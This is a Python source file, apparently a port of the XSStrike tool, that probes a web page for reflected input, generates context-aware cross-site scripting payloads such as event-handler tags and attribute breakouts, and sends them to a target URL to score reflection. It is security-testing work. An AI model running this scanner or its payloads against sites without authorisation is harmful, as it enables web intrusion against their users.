"""
XSS scanner — 1:1 conversion of s0md3v/XSStrike core flow.

Ports:
  - config.py payloads, tags, eventHandlers, functions, fillings
  - htmlParser context detection (script / attribute / html)
  - checker efficiency scoring (partial ratio without fuzzywuzzy)
  - generator context-aware vectors
  - modes/scan.py probe → parse → generate → test loop

Source: https://github.com/s0md3v/XSStrike
"""
from __future__ import annotations

import re
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from .._http import http_request
from .. import policy
from ._xsstrike_payloads import (
    XSSCHECKER,
    MIN_EFFICIENCY,
    BAD_TAGS,
    TAGS,
    FILLINGS,
    E_FILLINGS,
    L_FILLINGS,
    J_FILLINGS,
    EVENT_HANDLERS,
    FUNCTIONS,
    PAYLOADS,
)


def _partial_ratio(a: str, b: str) -> int:
    """Lightweight stand-in for fuzzywuzzy.fuzz.partial_ratio (0-100)."""
    a, b = (a or "").lower(), (b or "").lower()
    if not a or not b:
        return 0
    if a in b or b in a:
        return 100
    # longest common substring ratio
    best = 0
    for i in range(len(a)):
        for j in range(i + 1, len(a) + 1):
            sub = a[i:j]
            if sub in b:
                best = max(best, len(sub))
    return int(100 * best / max(len(a), 1))


def _escaped(pos: int, string: str) -> bool:
    if pos <= 0:
        return False
    return string[pos - 1] == "\\"


def html_parser(response_text: str, checker: str = XSSCHECKER) -> dict[int, dict]:
    """
    Port of XSStrike core/htmlParser.htmlParser — returns occurrences map.
    """
    response = response_text or ""
    reflections = response.count(checker)
    position_and_context: dict[int, dict] = {}
    clean = re.sub(r"<!--[\s\S]*?-->", "", response)

    # script contexts
    scripts = re.findall(r"(?i)<script[^>]*>([\s\S]*?)</script>", clean)
    for script in scripts:
        for m in re.finditer(re.escape(checker), script):
            pos = m.start()
            quote = ""
            for i, ch in enumerate(script[pos : pos + 80]):
                if ch in ("/", "'", "`", '"') and not _escaped(i, script[pos : pos + 80]):
                    quote = ch
                    break
            position_and_context[pos] = {
                "context": "script",
                "details": {"quote": quote},
                "score": {},
            }

    # attribute contexts
    for m in re.finditer(r"<[^>]*?(" + re.escape(checker) + r")[^>]*?>", clean):
        match = m.group(0)
        pos = m.start(1)
        if any(abs(pos - p) < 3 for p in position_and_context):
            continue
        parts = re.split(r"\s+", match)
        tag = parts[0][1:].lower() if parts else ""
        Type, quote, name, value = "", "", "", ""
        for part in parts[1:]:
            if checker not in part:
                continue
            if "=" in part:
                qm = re.search(r"=([\'`\"])?", part)
                quote = qm.group(1) if qm and qm.group(1) else ""
                nv = part.split("=", 1)
                name, value = nv[0], nv[1] if len(nv) > 1 else ""
                Type = "name" if checker == name else "value"
            else:
                Type = "flag"
                name = part
        position_and_context[pos] = {
            "context": "attribute",
            "details": {"tag": tag, "type": Type, "quote": quote, "name": name, "value": value},
            "score": {},
        }

    # html body contexts
    if len(position_and_context) < reflections:
        for m in re.finditer(re.escape(checker), clean):
            pos = m.start()
            if any(abs(pos - p) < 3 for p in position_and_context):
                continue
            # bad context?
            bad = False
            for bt in BAD_TAGS:
                if re.search(rf"<{bt}[^>]*>[^<]*{re.escape(checker)}", clean[max(0, pos - 200) : pos + 50], re.I):
                    bad = True
                    break
            position_and_context[pos] = {
                "context": "html",
                "details": {"bad": bad},
                "score": {"<": 100, ">": 100},
            }

    return position_and_context


def generate_vectors(occurrences: dict) -> list[dict[str, Any]]:
    """Port of XSStrike generator — context-aware vectors from real config."""
    vectors: list[dict[str, Any]] = []
    seen = set()

    # always include raw config payloads
    for p in PAYLOADS:
        if p not in seen:
            seen.add(p)
            vectors.append({"payload": p, "context": "config", "efficiency_hint": 90})

    for pos, occ in occurrences.items():
        ctx = occ.get("context")
        details = occ.get("details") or {}

        if ctx == "html" and not details.get("bad"):
            for tag in TAGS:
                for event, allowed in EVENT_HANDLERS.items():
                    if tag not in allowed:
                        continue
                    for func in FUNCTIONS:
                        for fill in FILLINGS[:2]:
                            payload = f"<{tag}{fill}{event}={func}>"
                            if payload not in seen:
                                seen.add(payload)
                                vectors.append({"payload": payload, "context": "html", "efficiency_hint": 80})

        if ctx == "attribute":
            quote = details.get("quote") or ""
            name = (details.get("name") or "").lower()
            # break out of attribute
            for func in FUNCTIONS:
                for q in (quote, '"', "'", ""):
                    if q:
                        payload = f"{q} onmouseover={func} {q}"
                    else:
                        payload = f" onmouseover={func} "
                    if payload not in seen:
                        seen.add(payload)
                        vectors.append({"payload": payload, "context": "attribute", "efficiency_hint": 75})
            if name in ("href", "src", "action"):
                payload = "javascript:confirm(1)"
                if payload not in seen:
                    seen.add(payload)
                    vectors.append({"payload": payload, "context": "attribute-js", "efficiency_hint": 70})

        if ctx == "script":
            quote = details.get("quote") or ""
            for func in FUNCTIONS:
                for jf in J_FILLINGS:
                    payload = f"{quote}{jf}{func}//"
                    if payload not in seen:
                        seen.add(payload)
                        vectors.append({"payload": payload, "context": "script", "efficiency_hint": 85})

    return vectors


def efficiency_check(response_text: str, payload: str, checker: str = XSSCHECKER) -> int:
    """Port of checker.py efficiency idea — reflection fidelity."""
    check = f"st4r7s{payload}3nd"
    body = (response_text or "").lower()
    if "st4r7s" not in body:
        # fallback: direct payload reflection
        if payload.lower() in body:
            return _partial_ratio(payload, payload)
        return 0
    # find reflection windows
    best = 0
    for m in re.finditer("st4r7s", body):
        window = body[m.start() : m.start() + len(check) + 20]
        best = max(best, _partial_ratio(check.lower(), window))
    return best


async def scan(
    url: str,
    parameter: str = "",
    max_payloads: int = 8,
    min_efficiency: int = MIN_EFFICIENCY,
    user_agent: str = "pyodide-security/xsstrike/1.0",
) -> dict[str, Any]:
    err = policy.check_url_for_active(url)
    if err:
        return {"ok": False, "error": err, "engine": "xss"}

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    headers = {"User-Agent": user_agent}
    p = urlparse(url)
    params = dict(parse_qsl(p.query, keep_blank_values=True))
    param = parameter or (next(iter(params)) if params else "q")

    # Phase 1: reflection probe with xsschecker (XSStrike flow)
    probe_params = dict(params)
    probe_params[param] = XSSCHECKER
    probe_url = urlunparse(p._replace(query=urlencode(probe_params, doseq=True)))
    probe_resp = await http_request(probe_url, headers=headers)
    body = probe_resp.get("body") or ""
    reflected = XSSCHECKER in body
    occurrences = html_parser(body, XSSCHECKER) if reflected else {}

    # Phase 2: generate vectors
    vectors = generate_vectors(occurrences)
    # always test config payloads even without reflection map
    if not vectors:
        vectors = [{"payload": p, "context": "config", "efficiency_hint": 90} for p in PAYLOADS]

    findings = []
    tested = 0
    for vec in vectors[: max(1, min(int(max_payloads), 80))]:
        if not policy.can_request():
            break
        payload = vec["payload"]
        test_params = dict(params)
        test_params[param] = f"st4r7s{payload}3nd"
        test_url = urlunparse(p._replace(query=urlencode(test_params, doseq=True)))
        resp = await http_request(test_url, headers=headers)
        eff = efficiency_check(resp.get("body") or "", payload)
        tested += 1
        if eff >= int(min_efficiency):
            findings.append({
                "payload": payload,
                "efficiency": eff,
                "context": vec.get("context"),
                "status": resp.get("status"),
                "parameter": param,
            })

    findings.sort(key=lambda x: -x["efficiency"])
    return {
        "ok": True,
        "url": url,
        "parameter": param,
        "reflected_checker": reflected,
        "occurrences": {str(k): v for k, v in occurrences.items()},
        "occurrence_count": len(occurrences),
        "tested": tested,
        "findings": findings,
        "finding_count": len(findings),
        "min_efficiency": min_efficiency,
        "payload_db": len(PAYLOADS),
        "engine": "xss",
        "version": "3.0-xsstrike",
        "equivalent": "s0md3v/XSStrike",
        "source": "https://github.com/s0md3v/XSStrike",
        "policy": policy.status(),
    }


def list_payloads() -> dict[str, Any]:
    return {
        "count": len(PAYLOADS),
        "payloads": list(PAYLOADS),
        "functions": list(FUNCTIONS),
        "tags": list(TAGS),
        "event_handlers": EVENT_HANDLERS,
        "source": "XSStrike core/config.py",
    }
